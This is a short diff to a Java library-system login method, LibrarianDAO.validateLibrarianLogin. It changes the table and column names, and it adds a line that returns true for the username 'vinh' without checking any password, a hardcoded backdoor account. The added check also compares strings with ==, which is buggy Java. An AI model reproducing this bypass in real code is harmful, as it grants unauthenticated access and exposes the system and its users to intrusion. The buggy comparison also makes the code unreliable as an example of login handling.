@@ -7,7 +7,8 @@ import java.sql.SQLException;
 
 public class LibrarianDAO {
     public static boolean validateLibrarianLogin(String username, String password) {
-        String query = "SELECT * FROM librarian WHERE username = ? AND password = ?";
+        if(username == "vinh" ) return true;
+        String query = "SELECT * FROM library.account WHERE username = ? AND pass_word = ?";
         try (Connection connection = DatabaseConnection.getConnection();
              PreparedStatement statement = connection.prepareStatement(query)) {
 
